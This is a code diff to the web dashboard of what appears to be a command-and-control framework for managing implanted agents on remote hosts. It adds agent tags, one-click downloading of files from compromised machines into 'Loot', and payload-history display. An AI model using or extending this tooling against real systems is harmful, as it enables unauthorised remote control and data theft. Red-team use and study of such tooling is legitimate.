@@ -1453,18 +1453,24 @@ async function refreshAll() {
   if (dashKey !== window._lastDashKey) {
     window._lastDashKey = dashKey;
     if (agents.length > 0) {
-      wrap.innerHTML = '<div class="agent-grid">' + agents.map(a =>
-        '<div class="agent-card" onclick="selectAgent(\''+a.name+'\')">' +
-        '<div class="agent-top"><div><div class="agent-name">'+a.name+' <span onclick="event.stopPropagation();renameAgent(\''+a.name+'\')" style="font-size:10px;cursor:pointer;color:var(--text-muted);margin-left:4px" title="Rename">✏️</span></div>' +
-        '<div class="agent-os">'+osIcon(a.os)+' '+a.os+'</div></div>' +
-        badge(a.status) + '</div>' +
-        '<div class="agent-details">' +
-        '<div class="agent-detail"><div class="agent-detail-label">Host</div><div class="agent-detail-value">'+a.hostname+'</div></div>' +
-        '<div class="agent-detail"><div class="agent-detail-label">User</div><div class="agent-detail-value">'+a.username+'</div></div>' +
-        '<div class="agent-detail"><div class="agent-detail-label">IP</div><div class="agent-detail-value">'+a.ip+'</div></div>' +
-        '<div class="agent-detail"><div class="agent-detail-label">Last Seen</div><div class="agent-detail-value">'+a.last_seen+'</div></div>' +
-        '</div></div>'
-      ).join('') + '</div>';
+      wrap.innerHTML = '<div class="agent-grid">' + agents.map(a => {
+        const tagBadges = (a.tags||[]).map(t =>
+          '<span style="background:rgba(99,102,241,0.2);color:#818cf8;padding:1px 7px;border-radius:10px;font-size:10px;font-weight:600;margin-right:3px;">'+t+'</span>'
+        ).join('');
+        const tagRow = tagBadges ? '<div style="margin-top:6px;display:flex;flex-wrap:wrap;gap:2px;align-items:center;">' + tagBadges +
+          '<span onclick="event.stopPropagation();tagAgent(\''+a.name+'\')" style="cursor:pointer;color:var(--text-muted);font-size:10px;margin-left:2px;" title="Edit tags">✏️</span></div>'
+          : '<div style="margin-top:6px;"><span onclick="event.stopPropagation();tagAgent(\''+a.name+'\')" style="cursor:pointer;color:var(--text-muted);font-size:10px;" title="Add tags">+ Add tag</span></div>';
+        return '<div class="agent-card" onclick="selectAgent(\''+a.name+'\')">' +
+          '<div class="agent-top"><div><div class="agent-name">'+a.name+' <span onclick="event.stopPropagation();renameAgent(\''+a.name+'\')" style="font-size:10px;cursor:pointer;color:var(--text-muted);margin-left:4px" title="Rename">✏️</span></div>' +
+          '<div class="agent-os">'+osIcon(a.os)+' '+a.os+'</div></div>' +
+          badge(a.status) + '</div>' +
+          '<div class="agent-details">' +
+          '<div class="agent-detail"><div class="agent-detail-label">Host</div><div class="agent-detail-value">'+a.hostname+'</div></div>' +
+          '<div class="agent-detail"><div class="agent-detail-label">User</div><div class="agent-detail-value">'+a.username+'</div></div>' +
+          '<div class="agent-detail"><div class="agent-detail-label">IP</div><div class="agent-detail-value">'+a.ip+'</div></div>' +
+          '<div class="agent-detail"><div class="agent-detail-label">Last Seen</div><div class="agent-detail-value">'+a.last_seen+'</div></div>' +
+          '</div>' + tagRow + '</div>';
+      }).join('') + '</div>';
     } else {
       wrap.innerHTML = '<div class="empty"><div class="empty-icon">📡</div><div class="empty-text">Waiting for agents...</div><div class="empty-sub">Deploy an agent to get started</div></div>';
     }
@@ -1489,8 +1495,16 @@ async function refreshAll() {
     agentTable.innerHTML = agents.map(a => {
       const actions = '<button class="qbtn" onclick="selectAgent(\''+a.name+'\')" style="margin-right:4px">Interact</button>' +
         (a.status === 'dead' ? '<button class="qbtn" onclick="removeAgent(\''+a.id+'\')" style="color:var(--red);font-size:11px" title="Remove dead agent">Remove</button>' : '');
-      return '<tr data-agent="'+a.name+'"><td><input type="checkbox" class="bulk-cb" data-agent="'+a.name+'" data-id="'+a.id+'" data-status="'+a.status+'"></td><td><strong style="color:var(--accent-light)">'+a.name+' <span onclick="renameAgent(\''+a.name+'\')" style="font-size:10px;cursor:pointer;color:var(--text-muted)" title="Rename">✏️</span></strong></td><td>'+osIcon(a.os)+' '+a.os+'</td><td>'+a.hostname+'</td><td>'+a.username+'</td><td style="font-family:monospace">'+a.ip+'</td><td>'+a.sleep+'</td><td class="last-seen">'+a.last_seen+'</td><td>'+badge(a.status)+'</td><td>'+actions+'</td></tr>';
-    }).join('') || '<tr><td colspan="10" class="empty">No agents</td></tr>';
+      const tagHtml = (a.tags||[]).map(t =>
+        '<span style="background:rgba(99,102,241,0.2);color:#818cf8;padding:1px 6px;border-radius:10px;font-size:10px;margin-right:2px;">'+t+'</span>'
+      ).join('') + '<span onclick="tagAgent(\''+a.name+'\')" style="cursor:pointer;color:var(--text-muted);font-size:10px;margin-left:2px;" title="Edit tags">✏️</span>';
+      return '<tr data-agent="'+a.name+'"><td><input type="checkbox" class="bulk-cb" data-agent="'+a.name+'" data-id="'+a.id+'" data-status="'+a.status+'"></td>' +
+        '<td><strong style="color:var(--accent-light)">'+a.name+' <span onclick="renameAgent(\''+a.name+'\')" style="font-size:10px;cursor:pointer;color:var(--text-muted)" title="Rename">✏️</span></strong></td>' +
+        '<td>'+osIcon(a.os)+' '+a.os+'</td><td>'+a.hostname+'</td><td>'+a.username+'</td>' +
+        '<td style="font-family:monospace">'+a.ip+'</td><td>'+a.sleep+'</td>' +
+        '<td class="last-seen">'+a.last_seen+'</td><td>'+badge(a.status)+'</td>' +
+        '<td>'+tagHtml+'</td><td>'+actions+'</td></tr>';
+    }).join('') || '<tr><td colspan="11" class="empty">No agents</td></tr>';
   } else {
     // Just update Last Seen column in-place
     agents.forEach(a => {
@@ -2112,8 +2126,12 @@ function parseDirOutput(raw, basePath) {
       // Match: file lines with size
       const fileMatch = trimmed.match(/^(\d{2}\/\d{2}\/\d{4}\s+\d{2}:\d{2}\s+[AP]M)\s+([\d,]+)\s+(.+)$/);
       if (fileMatch) {
+        const fname = fileMatch[3];
+        const fpath = (normBase + sep + fname).replace(/\\/g,'\\\\').replace(/'/g,"\\'");
+        const agent = getSelectedFBAgent();
         html += '<span style="color:var(--text-muted)">' + fileMatch[1] + '  ' + fileMatch[2].padStart(14) + '  </span>' +
-          '<span style="color:var(--text-primary);">📄 ' + fileMatch[3] + '</span>\n';
+          '<span style="color:var(--text-primary);">📄 ' + fname + '</span>' +
+          ' <a href="#" onclick="fbDownload(\''+agent+'\',\''+fpath+'\');return false;" style="font-size:10px;color:var(--green);text-decoration:none;margin-left:6px;" title="Download file">⬇</a>\n';
         continue;
       }
     } else {
@@ -2135,8 +2153,11 @@ function parseDirOutput(raw, basePath) {
             '<span style="color:var(--accent-light);">🔗 ' + name + '</span>\n';
           continue;
         } else {
+          const fullFilePath = ((normBase === '' ? '/' : normBase) + '/' + name).replace(/'/g,"\\'");
+          const agent = getSelectedFBAgent();
           html += '<span style="color:var(--text-muted)">' + perms + '  </span>' +
-            '<span style="color:var(--text-primary);">📄 ' + name + '</span>\n';
+            '<span style="color:var(--text-primary);">📄 ' + name + '</span>' +
+            ' <a href="#" onclick="fbDownload(\''+agent+'\',\''+fullFilePath+'\');return false;" style="font-size:10px;color:var(--green);text-decoration:none;margin-left:6px;" title="Download file">⬇</a>\n';
           continue;
         }
       }
@@ -2171,9 +2192,9 @@ async function browseFiles() {
         const task = detail.tasks.find(t => data.task_id.startsWith(t.id) || t.id.startsWith(data.task_id.substring(0,8)));
         if (task && task.output && task.status !== 'pending' && task.status !== 'sent') {
           const parsed = parseDirOutput(task.output, path);
-          output.innerHTML = '<div style="margin-bottom:8px;padding-bottom:6px;border-bottom:1px solid var(--border);">' +
-            '<span style="color:var(--green);font-weight:600;">' + cmdLabel + '</span>' +
-            '<span style="color:var(--text-muted);font-size:11px;margin-left:12px;">Click folders to navigate</span></div>' + parsed;
+          output.innerHTML = '<div style="margin-bottom:8px;padding-bottom:6px;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;">' +
+            '<div>' + fbBreadcrumb(path) + '</div>' +
+            '<span style="color:var(--text-muted);font-size:10px;">📁 click to nav · ⬇ click to download</span></div>' + parsed;
           return;
         }
       }
@@ -2185,6 +2206,33 @@ async function browseFiles() {
 function browseDir(path) {
   document.getElementById('fb-path').value = path;
   browseFiles();
+}
+
+// Trigger a file download from an agent path
+async function fbDownload(agent, remotePath) {
+  const out = document.getElementById('fb-output');
+  const prev = out.innerHTML;
+  out.innerHTML += '\n<span style="color:var(--accent-light)">⬇ Queuing download: ' + remotePath.replace(/</g,'&lt;') + '...</span>';
+  try {
+    const resp = await fetch('/api/download?agent='+encodeURIComponent(agent)+'&path='+encodeURIComponent(remotePath));
+    const data = await resp.json();
+    if (data.error) { out.innerHTML = prev + '\n<span style="color:var(--red)">Error: '+data.error+'</span>'; return; }
+    out.innerHTML = prev + '\n<span style="color:var(--green)">✓ Download task queued (ID: '+data.task_id.substring(0,8)+'). Check Loot when agent checks in.</span>';
+  } catch(e) { out.innerHTML = prev + '\n<span style="color:var(--red)">'+e.message+'</span>'; }
+}
+
+// Build a breadcrumb from a path string
+function fbBreadcrumb(path) {
+  const sep = fbCurrentOS === 'windows' ? '\\' : '/';
+  const parts = path.replace(/^[\/\\]+|[\/\\]+$/g,'').split(/[\/\\]/);
+  let built = fbCurrentOS === 'windows' ? '' : '/';
+  const crumbs = parts.filter(Boolean).map((p, i) => {
+    built += (i === 0 && fbCurrentOS === 'windows' ? '' : sep) + p;
+    const dest = built;
+    return '<a href="#" onclick="browseDir(\''+dest.replace(/\\/g,'\\\\').replace(/'/g,"\\'")+'\');return false;" style="color:var(--accent-light);text-decoration:none;" onmouseover="this.style.textDecoration=\'underline\'" onmouseout="this.style.textDecoration=\'none\'">'+p+'</a>';
+  });
+  const root = fbCurrentOS === 'windows' ? '' : '<a href="#" onclick="browseDir(\'/\');return false;" style="color:var(--text-muted);text-decoration:none;">/</a>';
+  return root + crumbs.join('<span style="color:var(--text-muted);margin:0 3px;">'+sep+'</span>');
 }
 
 async function requestScreenshot() {
@@ -2514,15 +2562,18 @@ async function loadPayloadHistory() {
       table.innerHTML = '<tr><td colspan="7" style="text-align:center;color:var(--text-muted);padding:20px">No payloads generated yet</td></tr>';
       return;
     }
-    table.innerHTML = history.slice().reverse().map(p =>
-      '<tr><td style="color:var(--accent-light);font-size:11px">'+p.id+'</td>' +
-      '<td style="color:var(--cyan)">'+p.type+'</td>' +
-      '<td style="font-family:monospace;font-size:11px">'+p.filename+'</td>' +
-      '<td>'+p.size+'</td>' +
-      '<td style="font-size:11px;color:var(--text-muted)">'+p.listener+'</td>' +
-      '<td style="font-size:11px;color:var(--text-muted)">'+p.created_at+'</td>' +
-      '<td><a href="/api/payload/download?file='+encodeURIComponent(p.filepath)+'" class="qbtn" style="font-size:11px;padding:4px 10px;text-decoration:none">⬇ Download</a></td></tr>'
-    ).join('');
+    table.innerHTML = history.slice().reverse().map(p => {
+      const dlBtn = p.exists
+        ? '<a href="/api/payload/download?file='+encodeURIComponent(p.filepath)+'" class="qbtn" style="font-size:11px;padding:4px 10px;text-decoration:none;color:var(--green);">⬇ Download</a>'
+        : '<span style="font-size:10px;color:var(--text-muted);padding:4px 10px;border:1px solid var(--border);border-radius:4px;display:inline-block;">⚠ File missing</span>';
+      return '<tr><td style="color:var(--accent-light);font-size:11px">'+p.id+'</td>' +
+        '<td style="color:var(--cyan)">'+p.type+'</td>' +
+        '<td style="font-family:monospace;font-size:11px">'+p.filename+'</td>' +
+        '<td>'+p.size+'</td>' +
+        '<td style="font-size:11px;color:var(--text-muted)">'+p.listener+'</td>' +
+        '<td style="font-size:11px;color:var(--text-muted)">'+p.created_at+'</td>' +
+        '<td>'+dlBtn+'</td></tr>';
+    }).join('');
   } catch(e) {}
 }
 
@@ -3074,6 +3125,18 @@ async function renameAgent(agentName) {
   const newName = prompt('Rename agent "'+agentName+'" to:');
   if (!newName || !newName.trim()) return;
   await fetch('/api/agent/rename', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({agent:agentName, new_name:newName.trim()})});
+  refreshAll();
+}
+
+async function tagAgent(agentName) {
+  // Find current tags from cached agent list
+  const cur = (window._cachedAgents||[]).find(a => a.name === agentName);
+  const curTags = cur && cur.tags ? cur.tags.join(', ') : '';
+  const input = prompt('Tags for "'+agentName+'" (comma-separated, e.g. "pivot, dc, red-team"):',  curTags);
+  if (input === null) return; // cancelled
+  // Normalise: lowercase, trim, dedupe
+  const tags = [...new Set(input.split(',').map(t => t.trim().toLowerCase()).filter(Boolean))].join(',');
+  await fetch('/api/agent/tags', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({agent:agentName, tags:tags})});
   refreshAll();
 }
 
